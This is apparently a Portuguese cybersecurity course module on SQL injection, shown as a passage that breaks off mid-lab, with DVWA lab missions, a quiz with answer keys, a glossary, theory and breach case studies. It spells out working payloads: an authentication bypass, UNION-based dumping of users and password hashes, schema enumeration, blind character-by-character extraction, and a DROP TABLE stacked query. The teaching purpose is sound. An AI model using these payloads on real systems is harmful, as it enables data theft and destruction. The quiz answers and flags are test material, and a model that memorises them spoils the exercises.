@@ -1,0 +1,988 @@
+---
+slug: sql-injection
+track: trilha-4
+title: "Injeção: SQL Injection"
+prerequisites: [web-por-dentro, burp-suite]
+lab: dvwa
+tasks:
+  - slug: missao-1-union
+    title: "Missão 1 — Despeje a tabela de usuários (in-band)"
+    type: flag
+    prompt: "Depois de extrair a tabela users com UNION-based SQL injection no nível low, a flag é FLAG{usuario-hash8}: o nome da conta cujo user_id é 3 e os 8 primeiros caracteres hexadecimais do hash de senha dela."
+    hint: "Primeiro descubra quantas colunas a consulta devolve (ORDER BY ou UNION SELECT NULL,...). Depois anexe user e password com UNION. A conta com user_id 3 é a terceira linha que aparece."
+    flag:
+      hash: "scrypt$16384$8$1$7d6369cbcf7a60205c7ea1dbd073bcc9af93a72fcabb167409b2e61ccbde0c66"
+      salt: "4124589c4cb21d8611e63abbc9c6299f"
+  - slug: missao-2-blind
+    title: "Missão 2 — Leia o que não aparece (blind)"
+    type: flag
+    prompt: "Na página SQL Injection (Blind), sem nenhum dado na tela, use blind SQL injection para medir o hash de senha do admin. A flag é FLAG{tamanho-4hex}: quantos caracteres o hash tem e os 4 primeiros caracteres hexadecimais dele, extraídos bit a bit."
+    hint: "A página só diz se o User ID existe ou não — um bit por requisição. Confirme o tamanho com LENGTH(...)=N e extraia cada caractere com SUBSTRING(password,posição,1). O usuário admin em hexadecimal é 0x61646d696e."
+    flag:
+      hash: "scrypt$16384$8$1$538fb734874159eeaaded24d9b5efb40d4861008c1d11e7e76c0344012b9b017"
+      salt: "b3534a9eca21f6bd0a812e5b6f181367"
+  - slug: quiz-final
+    title: "Quiz — Injeção: SQL Injection"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Qual é a causa-raiz da SQL injection?"
+        options:
+          - "O banco de dados tem um bug que a Oracle/MySQL nunca corrigiram"
+          - "A aplicação monta o comando SQL concatenando a entrada do usuário na mesma string, e o banco interpreta tudo como comando"
+          - "A senha do banco é fraca e o atacante adivinha"
+          - "O HTTPS não está configurado, então os dados vazam"
+        answer: 1
+        explanation: "A falha nasce na aplicação, não no banco: quando a entrada vira parte do texto do comando, o banco não tem como distinguir dado de comando. Bancos e TLS funcionam como devem; o erro é misturar os dois canais na montagem da query."
+      - question: "Num login, o campo de usuário recebe `' OR '1'='1' -- `. Por que isso costuma derrubar a autenticação?"
+        options:
+          - "A aspa criptografa a senha e o banco aceita qualquer valor"
+          - "O `OR '1'='1'` torna a condição do WHERE sempre verdadeira, e o `-- ` comenta o resto da query (inclusive a checagem de senha)"
+          - "O servidor reinicia e entra em modo de manutenção sem senha"
+          - "O `--` baixa o nível de segurança do banco para zero"
+        answer: 1
+        explanation: "A aspa fecha o literal; `OR '1'='1'` é sempre verdadeiro, então o WHERE casa com a primeira linha (em geral o admin); e o comentário `-- ` descarta o `AND senha = '...'` que viria depois. Nada é criptografado nem reiniciado."
+      - question: "Para que um `UNION SELECT` funcione, o SELECT injetado precisa, antes de tudo, de quê?"
+        options:
+          - "Ter o mesmo número de colunas que a consulta original (e tipos compatíveis)"
+          - "Ser executado como administrador do banco"
+          - "Rodar em um banco MySQL, nunca PostgreSQL"
+          - "Que a tabela alvo esteja vazia"
+        answer: 0
+        explanation: "UNION cola o resultado de dois SELECTs, e só é válido se os dois tiverem a mesma quantidade de colunas, com tipos que combinem. Por isso o primeiro passo é contar as colunas (com `ORDER BY` ou `UNION SELECT NULL,NULL,...`)."
+      - question: "Qual é a diferença entre SQL injection in-band e blind?"
+        options:
+          - "In-band é por GET, blind é por POST"
+          - "In-band usa a internet, blind é offline"
+          - "No in-band os dados (ou o erro) voltam na resposta; no blind nada aparece, e você infere o dado por diferença de comportamento ou de tempo"
+          - "Blind só funciona contra bancos Oracle"
+        answer: 2
+        explanation: "In-band (union-based, error-based) traz o dado de volta pelo mesmo canal da resposta. No blind a aplicação não ecoa nada, então você extrai um bit por vez — por uma mudança visível (boolean) ou pelo atraso de um SLEEP (time-based)."
+      - question: "Qual destas é a defesa que realmente elimina a SQL injection?"
+        options:
+          - "Trocar aspas simples por duas aspas na entrada (escaping manual)"
+          - "Uma blocklist que bloqueia as palavras UNION, SELECT e OR"
+          - "Prepared statements / parameterized queries: o comando vai ao banco com marcadores, e os dados viajam por um canal separado"
+          - "Esconder as mensagens de erro do banco"
+        answer: 2
+        explanation: "A parametrização separa, de verdade, comando de dado: o banco recebe o comando já compilado e os valores à parte, que nunca são interpretados como SQL. Escaping manual e blocklists têm desvios conhecidos; esconder erros só atrapalha o atacante (blind ainda funciona)."
+      - question: "Por que o usuário que a aplicação usa para se conectar ao banco NÃO deve ser o administrador do banco?"
+        options:
+          - "Para o banco rodar mais rápido"
+          - "Porque, se houver uma injeção, o estrago fica limitado ao que aquele usuário pode fazer (princípio do menor privilégio)"
+          - "Porque o administrador não consegue executar SELECT"
+          - "Para economizar licenças do banco"
+        answer: 1
+        explanation: "A parametrização é a cura; o menor privilégio é a rede de proteção. Se a aplicação se conecta com um usuário que só lê as tabelas de que precisa, uma injeção não consegue apagar tabelas, ler arquivos do sistema nem criar usuários — o dano é contido."
+      - question: "No DVWA, por que a versão `impossible` do código é segura e a `low` não?"
+        options:
+          - "A `impossible` usa HTTPS e a `low` não"
+          - "A `impossible` usa um prepared statement (PDO) com o id ligado por bindParam, além de validar que o id é numérico; a `low` concatena `$id` direto na string da query"
+          - "A `impossible` roda em outro servidor"
+          - "A `low` não tem senha de banco"
+        answer: 1
+        explanation: "No `low`, `\"...WHERE user_id = '$id'\"` concatena a entrada crua. No `impossible`, a query usa `:id` como marcador, `bindParam(..., PDO::PARAM_INT)` passa o valor pelo canal de dados e `is_numeric` rejeita o que não for número. É a diferença entre dado como comando e dado como dado."
+glossary:
+  - term: relational database
+    definition: "Banco de dados que organiza os dados em tabelas (linhas e colunas) com relações entre elas. É consultado por uma linguagem própria, o SQL."
+  - term: DBMS
+    definition: "Database Management System: o programa que guarda e serve o banco de dados (ex.: MySQL/MariaDB, PostgreSQL, Microsoft SQL Server, Oracle, SQLite). É quem interpreta e executa os comandos SQL."
+  - term: SQL
+    definition: "Structured Query Language: a linguagem padrão para consultar e alterar bancos de dados relacionais, com comandos como SELECT (ler), INSERT (inserir), UPDATE (alterar) e DELETE (apagar)."
+  - term: SQL query
+    definition: "Um comando SQL completo, como SELECT first_name FROM users WHERE user_id = '1'. A aplicação monta a query e a envia ao DBMS, que a executa e devolve o resultado."
+  - term: in-band SQL injection
+    definition: "Família de SQL injection em que os dados extraídos voltam pelo mesmo canal da resposta HTTP — na própria página (union-based) ou dentro da mensagem de erro (error-based). É a mais direta."
+  - term: union-based SQL injection
+    definition: "Técnica in-band que usa o operador UNION para anexar, ao resultado que a página já mostra, as colunas de uma consulta escolhida pelo atacante. Exige o mesmo número de colunas da consulta original."
+  - term: error-based SQL injection
+    definition: "Técnica in-band que força o banco a colocar o dado desejado dentro do texto de uma mensagem de erro (com funções como EXTRACTVALUE ou CAST), usada quando a página não exibe os resultados mas vaza erros."
+  - term: blind SQL injection
+    definition: "SQL injection em que a aplicação não devolve os dados nem o erro na resposta. O atacante infere a informação indiretamente, um bit por requisição, pela diferença de comportamento (boolean) ou de tempo (time-based)."
+  - term: boolean-based blind SQL injection
+    definition: "Blind em que o atacante injeta uma condição e observa se a página muda entre dois estados (ex.: 'existe' x 'não existe'), extraindo cada caractere por comparação (SUBSTRING)."
+  - term: time-based blind SQL injection
+    definition: "Blind em que nada muda visivelmente na página; o atacante faz o banco dormir (SLEEP) quando a condição é verdadeira e lê cada bit pelo atraso da resposta."
+  - term: out-of-band SQL injection
+    definition: "SQL injection em que o dado sai por um canal externo à resposta HTTP (por exemplo, uma consulta DNS disparada pelo banco e observada pelo atacante). Rara, depende de funções específicas do DBMS."
+  - term: UNION
+    definition: "Operador SQL que junta os resultados de dois SELECT num só, desde que tenham o mesmo número de colunas e tipos compatíveis. É a base da union-based SQL injection."
+  - term: information_schema
+    definition: "Banco de metadados padrão do SQL que descreve o próprio banco: quais bancos, tabelas e colunas existem. Consultá-lo é como o atacante descobre a estrutura antes de extrair os dados."
+  - term: SQL comment
+    definition: "Sequência que faz o banco ignorar o resto da linha: -- (dois hifens e um espaço) ou # no MySQL/MariaDB. Numa injeção, serve para descartar o pedaço final da query original."
+  - term: stacked queries
+    definition: "Empilhar mais de um comando numa injeção, separados por ponto e vírgula (ex.: '; DROP TABLE users; -- ), executando um comando totalmente novo. Depende de a API do banco permitir múltiplos comandos."
+  - term: second-order SQL injection
+    definition: "SQL injection em que a entrada maliciosa é primeiro armazenada (ex.: no cadastro) sem causar dano, e só dispara a falha depois, quando outra parte da aplicação a usa numa query."
+  - term: parameterized query
+    definition: "Query enviada ao banco com marcadores (? ou :nome) no lugar dos valores; os dados vão por um canal separado e nunca são interpretados como comando. É a mesma ideia do prepared statement e a defesa central contra SQL injection."
+  - term: ORM
+    definition: "Object-Relational Mapping: biblioteca que traduz objetos do código em linhas do banco (ex.: Hibernate, Prisma, Django ORM). Em geral gera queries parametrizadas por baixo, mas pode reabrir a falha quando se interpola SQL cru."
+  - term: WAF
+    definition: "Web Application Firewall: filtro que inspeciona as requisições HTTP e bloqueia as que casam com padrões de ataque. Ajuda como defesa em profundidade, mas é contornável e não substitui o código seguro."
+  - term: sqlmap
+    definition: "Ferramenta livre que automatiza a detecção e a exploração de SQL injection: identifica a técnica, enumera bancos e tabelas e extrai os dados. Poderosa, e por isso só se usa com autorização."
+  - term: MD5
+    definition: "Função de hash de 128 bits (32 caracteres hexadecimais) muito antiga, rápida e sem salt quando usada crua. Imprópria para senhas: um hash MD5 vazado é quebrado por wordlist quase instantaneamente."
+---
+
+import entradaComando from "./img/entrada-vira-comando.svg";
+import inBandBlind from "./img/in-band-vs-blind.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+Quase todo site guarda o que importa — logins, pedidos, mensagens, saldos — num
+<GlossaryTerm term="relational database">banco de dados relacional</GlossaryTerm>,
+uma coleção de tabelas que a aplicação consulta a cada clique. A conversa entre a
+aplicação e o banco é feita em <GlossaryTerm term="SQL">SQL</GlossaryTerm>
+(*Structured Query Language*), a linguagem padrão para ler e alterar esses dados.
+A <GlossaryTerm term="SQL injection">SQL injection</GlossaryTerm> (SQLi) acontece
+quando a aplicação monta esse comando grudando a sua entrada no meio do texto do
+comando: o banco então executa, como se fosse ordem do programador, o que na
+verdade veio do campo de um formulário. O resultado vai de "entrar sem senha" a
+"baixar o banco inteiro".
+
+Não é falha de museu. Como você viu em 4.1, a OWASP mantém a lista das classes de
+falha web mais críticas, o **OWASP Top 10**; na edição **2021**, *Injection*
+(que inclui a SQLi, CWE-89) ocupa a **terceira** posição — 94% das aplicações
+testadas tinham alguma forma de injeção, com 274.228 ocorrências levantadas. É
+uma das falhas mais antigas da web e, ainda assim, uma das que mais causam
+estrago, como os casos da seção 4 mostram.
+
+Este módulo fecha o ciclo **ataque + teoria + defesa**. Você vai entender *por
+que* o banco se deixa enganar (seção 2), explorar a falha à mão no DVWA, do
+primeiro apóstrofo ao banco despejado (seções 3 e 5), ver variações que aparecem
+no mundo real (seção 6) e, principalmente, aprender a escrever o código que
+**não** tem a falha (seção 8). O objetivo não é decorar *payloads*: é enxergar,
+em qualquer aplicação, onde a entrada vira comando.
+
+**Ao final, você vai saber:**
+
+- explicar, com o código à frente, por que a concatenação de string gera a SQLi
+  e por que a parametrização a elimina;
+- detectar uma injeção (com o apóstrofo, com lógica booleana e pelo tempo) e
+  dizer qual técnica cabe em cada situação;
+- explorar uma SQLi **in-band** por `UNION`: contar colunas, usar o
+  `information_schema` e despejar a tabela de usuários do DVWA;
+- extrair dados por SQLi **blind** (cega), um caractere por vez, quando nada
+  aparece na tela;
+- remediar a falha com <GlossaryTerm term="prepared statement">prepared
+  statements</GlossaryTerm>, menor privilégio e validação, e reconhecer as
+  defesas que **não** funcionam.
+
+**Pré-requisitos:**
+
+- **4.1 — Como a web funciona por dentro:** a requisição HTTP por dentro, os
+  parâmetros de query e de corpo, e a ideia-mãe deste módulo — a
+  *trust boundary*: tudo o que chega na requisição vem de fora e pode ser
+  forjado.
+- **2.5 — Burp Suite:** interceptar uma requisição, editá-la e reenviá-la pelo
+  Repeater. Você vai precisar disso para atacar os campos que não aparecem na
+  URL.
+
+**Tempo estimado:** de 4 a 6 horas, incluindo o laboratório.
+
+<Callout variant="ethics">
+Tudo aqui se faz **só** no laboratório local (o DVWA, que é vulnerável de
+propósito e não alcança a internet) ou em um alvo com **autorização por
+escrito**. Rodar qualquer um destes comandos contra um site de terceiros sem
+autorização é crime no Brasil (art. 154-A do Código Penal), como a Trilha 1
+tratou. SQL injection, pela natureza, altera e extrai dados reais: fora do
+escopo, o estrago — e a responsabilidade — são reais.
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+### 2.1 Um banco, uma linguagem, uma conversa
+
+Antes da falha, o cenário. Um <GlossaryTerm term="DBMS">DBMS</GlossaryTerm>
+(*Database Management System* — o programa que guarda e serve o banco, como o
+MySQL/MariaDB do DVWA) organiza os dados em tabelas. A tabela `users`, por
+exemplo, tem uma linha por usuário e colunas como `user_id`, `first_name`,
+`password`. A aplicação pede o que precisa escrevendo uma
+<GlossaryTerm term="SQL query">query</GlossaryTerm> — um comando SQL. O mais
+comum é o `SELECT`, que lê:
+
+```sql
+SELECT first_name, last_name FROM users WHERE user_id = '1';
+```
+
+Lê-se: "traga as colunas `first_name` e `last_name`, da tabela `users`, das
+linhas em que `user_id` vale `1`". Há `INSERT` (inserir), `UPDATE` (alterar),
+`DELETE` (apagar) e muitos outros, mas o `SELECT` é o que mais aparece e o que a
+maioria das SQLi explora primeiro.
+
+Repare num detalhe que é o centro de tudo: o `1` está **entre aspas simples**.
+Em SQL, aspas simples delimitam um *literal de texto* — um pedaço que é **dado**,
+não comando. Dentro das aspas pode estar qualquer coisa; fora delas, está a
+estrutura do comando (as palavras `SELECT`, `FROM`, `WHERE`, os nomes de coluna).
+A fronteira entre "o que é dado" e "o que é comando" é, literalmente, aquela
+aspa. Guarde isso: **a SQL injection é, na essência, apagar ou mover essa
+fronteira.**
+
+### 2.2 Onde nasce a falha: a query montada com um `+`
+
+A aplicação não escreve a query fixa; ela **monta** a query a cada requisição,
+encaixando os valores que vieram do usuário. O jeito ingênuo — e perigoso — de
+fazer isso é por **concatenação de string**: juntar pedaços de texto com o valor
+no meio. Este é o código **real** do DVWA no nível `low` (o arquivo
+`vulnerabilities/sqli/source/low.php`), em PHP:
+
+```php
+$id = $_REQUEST[ 'id' ];
+$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
+```
+
+O `$id` é o valor cru que chegou na requisição, enfiado direto no meio da string
+`$query`. Se o usuário manda `id=1`, a query vira exatamente aquela da seção 2.1,
+e tudo funciona. O problema é que `$id` pode conter **qualquer caractere** — e,
+entre eles, a própria aspa simples que marca a fronteira entre dado e comando.
+
+<Figure
+  src={entradaComando}
+  alt="Duas linhas comparam o mesmo código de concatenação. Em cima, entrada benigna: o usuário digita id=1; a aplicação monta SELECT first_name, last_name FROM users WHERE user_id = '1'; o banco devolve uma linha. Embaixo, entrada maliciosa: o usuário digita apóstrofo espaço OR '1'='1; a aplicação monta a mesma query, mas agora a aspa digitada fecha o literal antes do previsto e o resto vira a condição sempre verdadeira OR '1'='1; o banco devolve todas as linhas. Uma faixa final resume: o banco recebe uma string só e não tem como saber que os caracteres maliciosos vieram de um campo de formulário, e não do programador."
+  caption="A entrada entra na mesma string do comando. Quando ela traz uma aspa, fecha o literal antes da hora: o que era dado vira comando. Essa mistura é toda a SQL injection."
+/>
+
+### 2.3 O apóstrofo que quebra tudo
+
+Siga o que acontece quando o usuário, no campo de id, digita `' OR '1'='1`. A
+concatenação produz:
+
+```sql
+SELECT first_name, last_name FROM users WHERE user_id = '' OR '1'='1';
+```
+
+Leia devagar, porque é aqui que mora a mágica:
+
+- a **primeira aspa** da entrada fecha o literal que a aplicação tinha aberto;
+  `user_id = ''` agora compara com texto vazio;
+- o `OR '1'='1'` deixou de estar dentro de aspas: virou **estrutura do comando**,
+  uma condição lógica. E `'1'='1'` é **sempre verdadeiro**;
+- `WHERE (algo) OR (sempre verdadeiro)` é verdadeiro para **toda** linha da
+  tabela. O banco devolve todas.
+
+O usuário conseguiu reescrever a lógica da query sem nunca ter acesso ao código.
+Num campo de login, o mesmo truque — `' OR '1'='1' -- ` no usuário — faz o
+`WHERE user = '' OR '1'='1'` casar com a primeira linha (em geral o admin), e o
+<GlossaryTerm term="SQL comment">comentário SQL</GlossaryTerm> `-- ` (dois hifens
+e um espaço, no MySQL/MariaDB) manda o banco **ignorar o resto** da query — isto
+é, a parte `AND password = '...'` que faria a conferência da senha. Entra-se sem
+saber a senha.
+
+<Callout variant="info" title="Por que ' -- ' (com espaço no fim)?">
+No MySQL/MariaDB, o comentário de fim de linha é `-- ` e o espaço (ou uma quebra)
+**faz parte** da sintaxe: `--` colado a um caractere não vira comentário. Por isso
+os *payloads* costumam escrever `-- -` (os dois hifens, um espaço e um traço
+qualquer), garantindo o espaço. O `#` também comenta no MySQL, mas numa URL ele é
+o início do fragmento (4.1) e não chega ao servidor, então na web se prefere o
+`-- -`.
+</Callout>
+
+### 2.4 Por que o banco não percebe
+
+A pergunta natural é: por que o banco simplesmente não vê que aquilo é um ataque?
+Porque, para o banco, **não há ataque nenhum** — há um comando SQL perfeitamente
+válido que chegou como uma string de texto única. O DBMS recebe
+`SELECT ... WHERE user_id = '' OR '1'='1'`, passa pelo seu
+*parser* (como os parsers de 4.1), monta a árvore do comando e executa. Ele não
+tem como saber que o trecho `' OR '1'='1` veio de um `<input>` de formulário e
+não da pena do desenvolvedor: essa informação **se perdeu** no momento em que a
+aplicação concatenou tudo numa string só.
+
+É a mesma raiz que você viu em 4.1 e que reaparece a Trilha inteira: a mistura de
+**canais**. Código (o comando) e dados (os valores) deveriam viajar por caminhos
+separados; quando a aplicação os funde num texto só, quem recebe não consegue
+mais separá-los. A XSS (4.3) é esse mesmo erro com HTML/JavaScript; a command
+injection (4.6), com o shell. SQLi é a versão com SQL. Entender uma é entender
+as três.
+
+### 2.5 O mapa das técnicas: in-band, blind e out-of-band
+
+Explorar a SQLi é quase sempre **extrair dados** da falha. O que decide a técnica
+é uma única pergunta: *o que a resposta da aplicação deixa você ver?*
+
+<Figure
+  src={inBandBlind}
+  alt="Árvore de decisão. Pergunta inicial: a resposta mostra os dados da consulta na página? Se sim, é in-band union-based: os dados voltam na tela e você anexa o que quiser com UNION SELECT. Se não, mas vaza a mensagem de erro do banco, é error-based: force o dado para dentro do erro. Se não mostra dados nem erro, é blind (cega): se a página muda entre dois estados conforme a condição, é boolean-based (um bit por requisição com SUBSTRING); se a página não muda, é time-based (meça o tempo com SLEEP). Uma caixa lateral: out-of-band usa um canal externo, como DNS, quando nada acima dá sinal."
+  caption="A técnica certa depende do que a aplicação devolve. Da mais fácil (dados na tela) à mais trabalhosa (inferir pelo tempo), a pergunta é sempre: o que eu consigo observar?"
+/>
+
+- <GlossaryTerm term="in-band SQL injection">In-band</GlossaryTerm>: o dado volta
+  pelo **mesmo canal** da resposta. Em
+  <GlossaryTerm term="union-based SQL injection">union-based</GlossaryTerm>, os
+  dados aparecem na página (via `UNION`); em
+  <GlossaryTerm term="error-based SQL injection">error-based</GlossaryTerm>, dentro
+  da mensagem de erro do banco. É o caso mais direto, e o da Missão 1.
+- <GlossaryTerm term="blind SQL injection">Blind</GlossaryTerm> (cega): a página
+  **não** mostra os dados nem o erro. Você infere, um bit por requisição. Se a
+  página muda entre dois estados conforme a sua condição é verdadeira ou falsa, é
+  <GlossaryTerm term="boolean-based blind SQL injection">boolean-based</GlossaryTerm>;
+  se nada muda visivelmente, resta medir o tempo —
+  <GlossaryTerm term="time-based blind SQL injection">time-based</GlossaryTerm>,
+  fazendo o banco "dormir" quando a condição é verdadeira. É a Missão 2.
+- <GlossaryTerm term="out-of-band SQL injection">Out-of-band</GlossaryTerm>: o dado
+  sai por um canal externo (uma consulta DNS que o atacante observa, por exemplo).
+  Raro e dependente de funções específicas; fica como menção.
+
+## 3. Como o ataque funciona — a mecânica
+
+Esta seção é o passo a passo técnico com SQL de verdade. Na seção 5 você repete
+tudo no DVWA, com a saída real; aqui o foco é entender **cada etapa**. O alvo
+mental é a página de id do DVWA: ela recebe um `id` e devolve `First name` e
+`Surname` de quem tiver aquele `user_id`.
+
+### Passo 1 — Detectar: será que é injetável?
+
+O primeiro teste de toda SQLi é mandar **um apóstrofo** no campo e ver se a
+estrutura da query quebra. Se o `id` entra sem tratamento, `id='` produz:
+
+```sql
+SELECT first_name, last_name FROM users WHERE user_id = ''';
+```
+
+Três aspas: o banco não consegue casar as aspas e dá erro de sintaxe. Se a página
+devolve um erro de SQL (ou se comporta diferente), você achou a fronteira. O
+teste complementar é lógico: comparar `id=1` com `id=1' AND '1'='2` (deveria
+sumir o resultado) e `id=1' AND '1'='1` (deveria manter). Se o resultado responde
+à lógica que você injetou, é injeção confirmada.
+
+### Passo 2 — Contar as colunas
+
+Para usar <GlossaryTerm term="UNION">UNION</GlossaryTerm> — o operador que cola o
+resultado de dois `SELECT` — os dois `SELECT` precisam ter o **mesmo número de
+colunas**. Então, antes de qualquer extração, descubra quantas colunas a consulta
+original devolve. Dois caminhos:
+
+```sql
+-- Caminho A: ORDER BY crescente até dar erro.
+1' ORDER BY 1-- -      -- ok
+1' ORDER BY 2-- -      -- ok
+1' ORDER BY 3-- -      -- ERRO: "Unknown column '3' in 'order clause'"  => são 2 colunas
+
+-- Caminho B: UNION SELECT com NULLs até parar de dar erro.
+1' UNION SELECT NULL-- -        -- erro (números de colunas diferentes)
+1' UNION SELECT NULL,NULL-- -   -- ok  => são 2 colunas
+```
+
+O `NULL` serve como "coluna coringa": encaixa em qualquer tipo. Quando o número
+de `NULL`s bate com o número de colunas, o erro some. A consulta da página do
+DVWA tem **2 colunas** (`first_name`, `last_name`).
+
+### Passo 3 — Achar onde o dado aparece e extraí-lo
+
+Com 2 colunas confirmadas, troque os `NULL`s pelos dados que você quer. Como a
+página imprime as duas colunas (`First name` e `Surname`), o que você puser no
+`UNION SELECT` aparece ali:
+
+```sql
+1' UNION SELECT user, password FROM users-- -
+```
+
+A primeira metade (`user_id = '1'`) traz uma linha; o `UNION` **anexa** uma linha
+por usuário da tabela `users`, com o login no lugar do `First name` e o hash da
+senha no lugar do `Surname`. O banco entrega tudo junto.
+
+### Passo 4 — Mapear o banco com o `information_schema`
+
+E se você não soubesse que existe uma tabela `users` com uma coluna `password`?
+O SQL tem um banco de metadados padrão, o
+<GlossaryTerm term="information_schema">`information_schema`</GlossaryTerm>, que
+descreve o próprio banco. Dá para perguntar quais tabelas e colunas existem:
+
+```sql
+-- Quais tabelas existem no banco atual?
+1' UNION SELECT table_name, table_schema FROM information_schema.tables
+   WHERE table_schema = database()-- -
+
+-- Quais colunas tem a tabela users?
+1' UNION SELECT column_name, 0x3a FROM information_schema.columns
+   WHERE table_name = 0x7573657273-- -
+```
+
+O `0x7573657273` é a string `users` escrita em hexadecimal — um truque útil
+quando você quer evitar aspas no *payload* (às vezes um filtro as bloqueia). O
+`0x3a` é só `:`, um enchimento para a segunda coluna. Com a estrutura mapeada,
+você sabe exatamente o que extrair.
+
+### Passo 5 — Quando nada aparece: blind
+
+Se a página **não** imprime o resultado (só diz "usuário existe" ou "não
+existe"), o `UNION` não ajuda — não há onde o dado aparecer. Aí se extrai por
+inferência. A pergunta vira binária, e você a faz sobre um caractere de cada vez:
+
+```sql
+-- O primeiro caractere do hash do admin é '5'?  (0x35 é '5' em hex)
+1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE user=0x61646d696e) = 0x35-- -
+```
+
+Se a resposta for o estado "verdadeiro" (a página se comporta como no `id=1`), o
+caractere é `5`. Senão, você tenta `6`, `7`... Repetindo para cada posição,
+reconstrói o hash inteiro. Quando nem isso muda a página, troca-se a comparação
+por um `SLEEP`: se a resposta **demora**, a condição era verdadeira. É lento, mas
+funciona — e é o que a seção 5 faz na prática, com a saída real.
+
+## 4. Casos reais — o que aconteceu no mundo
+
+### TalkTalk: a SQLi que custou um recorde (2015–2016)
+
+A TalkTalk é uma grande operadora de telecom e internet do Reino Unido. Em
+**outubro de 2015**, foi atacada por SQL injection em três páginas web
+vulneráveis — páginas herdadas da infraestrutura da Tiscali, que a TalkTalk tinha
+**adquirido em 2009** e nunca reavaliado. O banco por trás rodava uma versão
+desatualizada do MySQL, com uma falha conhecida e já corrigida pelo fornecedor
+desde 2012. Segundo a investigação do regulador britânico, o atacante usou a
+ferramenta <GlossaryTerm term="sqlmap">sqlmap</GlossaryTerm> para varrer e
+explorar a injeção.
+
+Em **5 de outubro de 2016**, o ICO (*Information Commissioner's Office*, a
+autoridade de proteção de dados do Reino Unido) aplicou uma multa **recorde** à
+época: **£400.000**. Os números do incidente, apurados pelo ICO: os dados
+pessoais de **156.959** clientes foram acessados (nome, endereço, data de
+nascimento, telefone, e-mail) e, em **15.656** desses casos, também o **número da
+conta bancária e o sort code**.
+
+- **Impacto:** multa de £400.000 e, somando resposta e perdas, um custo
+  estimado em dezenas de milhões de libras; dois jovens foram condenados pelo
+  ataque.
+- **Lição:** SQLi é falha **conhecida e evitável**. Herdar sistemas numa aquisição
+  sem auditá-los, e rodar bancos desatualizados, transforma uma falha antiga numa
+  porta aberta. Parametrizar e atualizar teria barrado tudo.
+- **Fonte:** [ICO — penalty notice e comunicado da multa à TalkTalk (05/10/2016)](https://ico.org.uk/action-weve-taken/enforcement/talktalk-telecom-group-plc/).
+
+### Heartland Payment Systems: o maior roubo de cartões via SQLi (2007–2009)
+
+A Heartland Payment Systems era uma das maiores processadoras de pagamento dos
+EUA. O ponto de entrada da invasão que a vitimou foi uma **SQL injection** numa
+aplicação web corporativa; a partir dela, os atacantes chegaram à rede que
+processava transações de cartão. Em **17 de agosto de 2009**, o Departamento de
+Justiça dos EUA (DOJ) indiciou **Albert Gonzalez**, 28 anos, de Miami, e dois
+cúmplices, pelo roubo de dados de **mais de 130 milhões** de cartões de crédito e
+débito — à época, o maior caso de invasão e roubo de identidade já processado nos
+EUA. O indiciamento nomeia como vítimas corporativas a Heartland, a rede de lojas
+7-Eleven e a cadeia de supermercados Hannaford Brothers, e descreve o método como
+*"SQL injection attack"*.
+
+- **Impacto:** 130+ milhões de cartões expostos; Gonzalez foi condenado, em 2010,
+  a 20 anos de prisão; a Heartland arcou com mais de US$ 100 milhões entre multas
+  e acordos.
+- **Lição:** uma SQLi numa aplicação web secundária serviu de ponte para o
+  coração do negócio. Uma falha "só de um site" pode custar a empresa inteira;
+  segmentar a rede e parametrizar as queries são defesas que se somam.
+- **Fonte:** [US DOJ — comunicado do indiciamento de Albert Gonzalez (17/08/2009)](https://www.justice.gov/archives/opa/pr/alleged-international-hacker-indicted-massive-attack-us-retail-and-banking-networks).
+
+## 5. Mãos à obra — o laboratório guiado
+
+**Objetivo:** ao terminar, você terá explorado a SQLi do DVWA de duas formas.
+Na **Missão 1** (in-band), vai despejar a tabela `users` inteira com `UNION` e
+achar, na conta de `user_id` 3, a flag `FLAG{usuario-hash8}`. Na **Missão 2**
+(blind), com a página sem mostrar nenhum dado, vai medir o hash do `admin`
+caractere a caractere e montar a flag `FLAG{tamanho-4hex}`. Cada missão rende uma
+flag.
+
+O laboratório é o **`dvwa`**: o Kali e o DVWA (*Damn Vulnerable Web Application*)
+na rede interna `lab_net`. O DVWA é uma aplicação vulnerável **de propósito**,
+feita para treino, e não alcança nada fora do lab.
+
+### 5.1 Subir o lab e preparar (passo a passo)
+
+1. No painel **Laboratório**, no topo desta página, clique em **Iniciar**. Pelo
+   terminal do WSL, a alternativa é `scripts/lab.sh up dvwa`.
+2. Quando o desktop do Kali aparecer, clique nele, abra o **Firefox** e vá a
+   `http://dvwa/login.php`.
+3. Entre com o usuário `admin` e a senha `password`. É a conta padrão do DVWA.
+4. No menu da esquerda, abra **DVWA Security**, escolha **Low** e clique em
+   **Submit**. Começamos no nível mais simples para enxergar a mecânica; a seção
+   6 sobe a dificuldade.
+5. Abra **SQL Injection**. Há um campo **User ID** e um botão **Submit**.
+
+<Callout variant="info" title="Autorização — exercício 4.2 (laboratório local)">
+**Ativo autorizado:** o contêiner `dvwa` do lab local, e somente ele.
+
+**Técnicas autorizadas:** SQL injection (in-band e blind) contra os módulos *SQL
+Injection* e *SQL Injection (Blind)* do DVWA, pela interface web, a partir do Kali
+do lab.
+
+**Fora do escopo:** qualquer host fora do lab, a rede `desktop_net` (a que carrega
+a sua tela) e técnicas que derrubem o serviço. SQLi altera dados: aqui o alvo é
+descartável (há o botão **Resetar**); num alvo real, extração destrutiva só com
+autorização explícita.
+</Callout>
+
+<Callout variant="warning" title="Um laboratório por vez">
+Se outro lab estiver no ar, o botão vira **Trocar para este lab**. O DVWA traz
+junto o banco; feche o que não estiver usando antes de subir (regra dos 16 GB).
+</Callout>
+
+### 5.2 Missão 1 — Despeje a tabela de usuários (in-band)
+
+**Passo 1 — Confirme a injeção.** No campo **User ID**, digite só `1` e Submit. A
+página mostra uma linha (o `admin`). Agora digite uma aspa simples, `'`, e Submit.
+A página devolve o erro do banco — a prova de que a sua entrada chegou crua à
+query:
+
+```text
+Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax;
+check the manual that corresponds to your MariaDB server version for the right
+syntax to use near ''1''' at line 1 in /var/www/html/vulnerabilities/sqli/source/low.php:11
+```
+
+O erro até entrega o caminho do arquivo e o banco (MariaDB, um "primo" do MySQL).
+A fronteira entre dado e comando está aberta.
+
+**Passo 2 — Conte as colunas.** Você precisa saber quantas colunas a consulta
